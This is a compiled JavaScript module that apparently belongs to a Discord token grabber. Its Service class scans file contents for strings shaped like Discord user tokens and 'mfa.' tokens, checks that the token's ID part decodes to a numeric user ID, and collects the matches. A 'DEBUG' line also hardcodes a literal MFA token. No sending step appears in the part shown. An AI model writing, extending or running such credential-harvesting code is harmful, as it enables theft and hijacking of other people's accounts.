"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.Service = void 0;
const XRegExp = require("xregexp");
const fs = require("promise-fs");
const storage_1 = require("@assasans/storage");
const token_1 = require("../token");
class Service {
    constructor(name, directory) {
        this.name = name;
        this.directory = directory;
    }
    extractTokens(content) {
        var _a;
        const tokens = new storage_1.List();
        for (const match of XRegExp.match(content, /[\w]{24}\.[\w-]{6}\.[\w-]{27}/, 'all')) {
            const idMatch = (_a = XRegExp.match(match, /^[\w]{24}/, 'one')) !== null && _a !== void 0 ? _a : '';
            const id = Buffer.from(idMatch, 'base64').toString();
            if (/^[0-9]{16,}$/.test(id)) {
                tokens.add(new token_1.Token(this, token_1.TokenType.Normal, match));
            }
        }
        for (const match of XRegExp.match(content, /mfa\.[\w-]{84}/, 'all')) {
            tokens.add(new token_1.Token(this, token_1.TokenType.MFA, match));
        }
        // DEBUG
        tokens.add(new token_1.Token(this, token_1.TokenType.MFA, "mfa.gZ3ga7RSOLslnH5MEWC5O8-VsX5xvWswilndBYCbUy6gQhG4NYVr4fES14P9AsHgKN7-2LIzRyw3YhQNGP-g"));
        return tokens;
    }
    async exists(path) {
        try {
            await fs.stat(path);
            return true;
        }
        catch {
            return false;
        }
    }
}
exports.Service = Service;
//# sourceMappingURL=service.js.map